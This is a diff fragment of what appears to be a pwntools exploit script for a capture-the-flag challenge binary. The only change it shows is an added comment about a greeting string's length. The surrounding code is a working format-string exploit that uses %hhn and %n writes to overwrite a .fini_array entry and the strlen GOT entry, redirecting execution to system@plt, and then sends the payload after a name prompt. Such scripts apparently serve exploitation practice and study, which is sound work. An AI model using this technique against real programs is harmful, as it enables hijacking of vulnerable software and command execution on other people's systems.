@@ -8,6 +8,7 @@ fini_array = 0x8049934
 
 payload = b'BB' + p32(fini_array) + p32(elf.got["strlen"])
 payload += "%{}c".format(0xed - len(payload) -  0x12).encode("utf-8") + b"%12$hhn"
+# 0x20 is 'Nice to meet you, '
 payload += "%{}c".format(elf.plt["system"] - 0xed).encode("utf-8") + b"%13$n"
 r.recvuntil(b"Please tell me your name... ")
 r.sendline(payload)
